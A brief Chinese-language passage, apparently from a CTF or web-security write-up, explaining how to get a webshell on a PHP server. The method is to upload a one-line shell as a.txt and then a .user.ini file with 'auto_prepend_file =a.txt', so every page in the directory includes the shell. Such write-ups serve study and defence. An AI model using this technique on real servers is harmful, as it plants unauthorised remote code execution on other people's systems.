这两个配置可以在php文件执行之前先包含制定的文件，所以我们可以上传一个图片马，这样就可以通过.user.ini使得这个图片马被包含，从而获取webshell


~~~

~~~
1.我们先将一句话保存为a.txt。
2.上传a.txt
3上传.user.ini文件。
对于php中的.user.ini有如下解释：
PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。
我们在.user.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容、
~~~



